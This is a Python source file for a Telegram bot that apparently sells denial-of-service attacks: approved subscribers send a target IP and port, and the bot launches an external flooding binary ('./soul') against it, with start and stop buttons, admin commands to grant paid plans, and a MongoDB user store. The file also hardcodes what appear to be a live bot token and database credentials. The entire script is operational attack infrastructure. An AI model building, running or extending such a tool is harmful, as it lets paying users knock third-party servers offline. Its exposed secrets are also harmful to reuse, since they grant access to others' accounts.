import telebot
import logging
import subprocess
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
TOKEN = '7355970298:AAFhaliBO5oupwSIpgYaRgO50zb96FsyzoM'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
CHANNEL_ID = -1002172120754
ADMIN_IDS = [5181364124]
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the process
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                logging.error(f"Failed to kill process with PID {pid}: {e}")

def is_user_admin(user_id, chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0 and (user_data.get('valid_until') == "" or datetime.now().date() <= datetime.fromisoformat(user_data['valid_until']).date()):
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

def send_main_buttons(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn_attack = KeyboardButton("ATTACK")
    btn_start = KeyboardButton("Start Attack 🚀")
    btn_stop = KeyboardButton("Stop Attack")
    markup.add(btn_attack, btn_start, btn_stop)
    
    bot.send_message(message.chat.id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message)

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])
        
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        bot.send_message(chat_id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approving user: {e}")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(chat_id, "*Invalid command format. Use /disapprove <user_id>.*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])

        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        bot.send_message(chat_id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in disapproving user: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    bot.send_message(chat_id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid command format. Please provide target_ip and target_port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message)
    except Exception as e:
        logging.error(f"Error in processing attack IP and port: {e}")

@bot.message_handler(func=lambda message: message.text == "ATTACK")
def attack_button(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    bot.send_message(chat_id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        target_ip, target_port = attack_details
        if target_ip and target_port:
            if target_ip and target_port > 0:
                run_attack_command_sync(target_ip, target_port, 1)
                bot.send_message(chat_id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}*", parse_mode='Markdown')
            else:
                bot.send_message(chat_id, "*Invalid IP or port. Please use /Attack to set them up.*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*IP and port are not set properly. Please use /Attack to set them up.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*No IP and port set. Please use /Attack to set them up.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        target_ip, target_port = attack_details
        if target_ip and target_port:
            run_attack_command_sync(target_ip, target_port, 2)
            bot.send_message(chat_id, f"*Attack stopped for Host: {target_ip} and Port: {target_port}*", parse_mode='Markdown')
            user_attack_details.pop(user_id, None)
        else:
            bot.send_message(chat_id, "*IP and port are not set properly. Cannot stop attack.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*No active attack found to stop.*", parse_mode='Markdown')

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
